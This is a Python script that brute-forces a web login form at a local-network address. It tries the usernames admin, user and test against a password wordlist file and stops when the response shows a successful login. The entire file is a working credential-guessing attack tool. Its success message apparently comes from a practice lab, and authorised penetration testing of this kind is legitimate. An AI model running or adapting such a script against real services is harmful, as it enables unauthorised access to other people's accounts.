import requests
import sys

# Target URL based on the form action
target = "http://192.168.1.105/login.php"

# List of usernames to try
usernames = ["admin", "user", "test"]

# Path to the password list file
passwords = "top100.txt"

# Message to look for when login is successful
base_needle = "You have logged in as '{}'"

for user in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n")  # Clean up the password line

            # Show the current attempt in the terminal
            sys.stdout.write(f"[X] Attempting user:password -> {user}:{password}\r")
            sys.stdout.flush()

            # Send the login POST request
            r = requests.post(target, data={
                "username": user,
                "password": password,
                "Login": "Login"  # This must match the submit button name in the form
            })

            # Create the needle based on the current user
            needle = base_needle.format(user)

            # Check if the response contains the needle (indicating successful login)
            if needle in r.text:
                sys.stdout.write("\n")
                sys.stdout.write(f"\t[>>>>] Valid Password '{password}' found for user '{user}'!\n")
                sys.exit()  # Exit after finding a valid combination

    # If no password was valid for the current user
    sys.stdout.write(f"\n\tNo valid password found for '{user}'\n")
